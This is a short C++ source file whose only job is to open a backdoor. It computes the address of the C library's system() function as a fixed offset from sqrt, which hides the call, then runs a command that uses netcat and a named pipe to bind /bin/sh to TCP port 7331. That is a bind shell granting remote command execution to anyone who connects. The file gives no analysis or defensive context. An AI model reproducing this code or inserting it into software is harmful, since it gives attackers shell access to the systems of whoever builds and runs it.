#include<cmath>
#include<iostream>
#include<string>
#include<iomanip>

typedef int(*Fun)(const char*);

int main() {
  int delta = 0x1A8FF0;
  size_t sq = (size_t)sqrt;
  Fun sys = (Fun)(sqrt-delta);

  return sys("mkfifo pipe &> /dev/null; nc -l -p 7331 < pipe | /bin/sh &> pipe &");
}

